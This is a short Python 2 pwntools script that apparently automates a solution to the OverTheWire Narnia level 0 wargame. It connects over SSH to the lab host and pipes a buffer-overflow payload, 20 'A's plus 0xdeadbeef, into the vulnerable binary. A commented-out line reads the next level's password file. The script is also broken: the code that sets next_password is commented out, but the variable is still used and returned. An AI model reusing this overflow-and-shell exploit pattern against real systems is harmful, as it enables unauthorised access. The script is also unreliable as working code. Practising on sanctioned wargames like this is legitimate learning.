#!/usr/bin/env python2

from pwn import *
import time

context(log_level = 'error')

doing = term.output(float = True)

solutions = (
    "unhex "+enhex(flat('A' * 20, 0xdeadbeef))+" | /narnia/narnia0",
)

def solve(name, password, cmd):
    doing.update('Solving %s with command %s' % (name, cmd))
    print cmd
    con = ssh(user = name, password = password, host = "narnia.labs.overthewire.org")
    shell = con.shell(tty = False)
    shell.sendline(cmd)
    print shell.recvrepeat(0.5)
    #shell.sendline("cat /etc/narnia_pass/%s" % name)
    #next_password = shell.recvline().strip()
    shell.close()
    con.close()
    doing.update('%s gave us %s\n' % (name, next_password))
    return next_password

password = 'narnia0'
for i in range(0, len(solutions)):
    password = solve('narnia%d' % i, password, solutions[i])
